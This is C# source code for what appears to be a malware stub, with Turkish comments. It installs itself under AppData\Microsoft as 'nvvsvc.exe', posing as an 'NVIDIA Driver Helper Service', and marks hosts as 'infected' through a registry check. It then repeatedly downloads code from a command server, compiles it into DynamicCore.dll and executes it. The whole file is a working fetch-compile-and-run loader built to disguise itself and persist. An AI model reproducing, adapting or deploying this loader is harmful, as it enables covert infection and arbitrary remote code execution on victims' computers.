using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Timers;
using System.Threading;
using System.ComponentModel;
using DynamicCore;
using System.IO;

namespace Stub
{
    public class Program
    {
        [STAThread]
        static void Main() { Program p = new Program(); Application.Run(); }
        BackgroundWorker worker = new BackgroundWorker();
        CWCompiler Derleyici = new CWCompiler();
        string codeServer = "http://127.0.0.1/codes";
        string dllName = "DynamicCore.dll";
        string dllFilePath = null;
        string Code = null;
        bool coreSuccesfully_Loaded  = false;
        bool coreSuccesfully_Started = false;
        bool isAlreadyInfected = false;
        System.Windows.Forms.Timer timer30M = new System.Windows.Forms.Timer() { Interval = 1800000 };
        System.Windows.Forms.Timer timer1M = new System.Windows.Forms.Timer() { Interval = 1000000 };
        System.Windows.Forms.Timer timer5S = new System.Windows.Forms.Timer() { Interval = 5000 };


        //--------------------------------------------------------------------------------------
        Program()
        {
            Register.Isim = "nvvsvc.exe";
            Register.Konum = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\";
            Register.Aciklama = "NVIDIA Driver Helper Service";

            timer1M.Tick += Timer1M_Tick;
            timer1M.Enabled = true;
            //Application.ApplicationExit += { };
            worker.DoWork += new DoWorkEventHandler(InitCore);
            worker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(InitCoreFinished);
            worker.RunWorkerAsync();


            isAlreadyInfected = Register.RegeditCheck();
            if (isAlreadyInfected)
                dllFilePath = Environment.CurrentDirectory + "\\" + dllName;
            else
                dllFilePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\" + dllName;
            if (!isAlreadyInfected)
            {
                if (Register.Infect())
                    Console.WriteLine("--->Infected");
                else
                    Console.WriteLine("--->Not Infected");
            }
        }
        //--------------------------------------------------------------------------------------
        private void Timer1M_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!coreSuccesfully_Loaded)
                    worker.RunWorkerAsync();
                else
                    timer1M.Enabled = false;
            }catch{} 
        }
        //--------------------------------------------------------------------------------------
        void InitCore(object sender, DoWorkEventArgs e)
        {
            Console.WriteLine("Initializing Core...");
            coreSuccesfully_Started = false;
            coreSuccesfully_Loaded = false;

            //Internet adresinden kodu alıyor
            string rawCode = null;
            string[] codeParts = null;
            WebClient wc = new WebClient();
            wc.Encoding = Encoding.UTF8;
            try {
                rawCode = wc.DownloadString(codeServer);

            }
            catch {}


            if ( rawCode != null )
            {
                Derleyici.ReferenceListesi.Clear();
                Derleyici.UsingListesi.Clear();
                Code = "";
                //Alınan kodu parçalayıp($ ile) dll,usingler, ve kodu ayırıyor
                codeParts = rawCode.Split('$');
                Derleyici.ReferenceListesi.Add(Application.ExecutablePath);
                foreach (string s in codeParts[0].Split(';'))
                    Derleyici.ReferenceListesi.Add(s);
                foreach (string s in codeParts[1].Split(';'))
                    Derleyici.UsingListesi.Add(s + ";");
                for (int i = 2; i < codeParts.Length; i++)
                    Code += codeParts[i]+"&";
                Code = Code.Substring(0, Code.Length - 1);
            }

            //Dll oluşturuyor varsa çalıştıryor
            if (!Derleyici.LoadDllFromFile(dllFilePath))
            {
                if (codeParts != null )
                {
                    if( Derleyici.Compile(Code, true, dllFilePath) )
                    {
                        //-----------------------------
                        Console.WriteLine("Kaydetti");
                        //-----------------------------
                    }
                    else
                    {
                        Reporter.Show("ERR", "Dll yok ve Derlerken Hata :(");
                        return;
                    }
                }
                else
                {
                    Reporter.Show("ERR","Ne DLL var ne de bağlanıldı :(");
                    return;
                }
            }
            //--------------------
            coreSuccesfully_Loaded = true;

            //Dll yi çalıştırıyor
            object temp = Derleyici.Run("Main", new object[] { "" }); //En az 1 parametre olacak
            if (temp != null && temp.ToString().StartsWith("ERR"))
            {
                Reporter.Show("ERR", temp.ToString().Split('|')[1]);
            }else
            {
                coreSuccesfully_Started = true;
            }

        }
        //--------------------------------------------------------------------------------------
        void InitCoreFinished(object sender, RunWorkerCompletedEventArgs e)
        {
            if (!coreSuccesfully_Loaded)
            {
                Reporter.Show("ERR", "Core not initialized");
                return;
            }
                

            if (!coreSuccesfully_Started)
            {
                File.Delete(dllFilePath);
                Application.Restart();
                return;
            }
        }
        //--------------------------------------------------------------------------------------

    }
}
